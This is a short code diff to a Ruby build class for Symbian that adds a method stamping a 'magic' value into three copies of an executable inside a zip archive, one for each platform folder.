@@ -160,6 +160,21 @@ class BuildSymbian < Build
 
   end
 
+  def unique(core)
+    Zip::ZipFile.open(core) do |z|
+      core_content = z.file.open('5th/SharedQueueMon_20023635.exe', "rb") { |f| f.read }
+      add_magic(core_content)
+      z.file.open('5th/SharedQueueMon_20023635.exe', "wb") { |f| f.write core_content }
+
+      core_content = z.file.open('3rd/SharedQueueMon_20023635.exe', "rb") { |f| f.read }
+      add_magic(core_content)
+      z.file.open('3rd/SharedQueueMon_20023635.exe', "wb") { |f| f.write core_content }
+
+      core_content = z.file.open('symbian3/SharedQueueMon_20023635.exe', "rb") { |f| f.read }
+      add_magic(core_content)
+      z.file.open('symbian3/SharedQueueMon_20023635.exe', "wb") { |f| f.write core_content }
+    end
+  end
 
 end
 
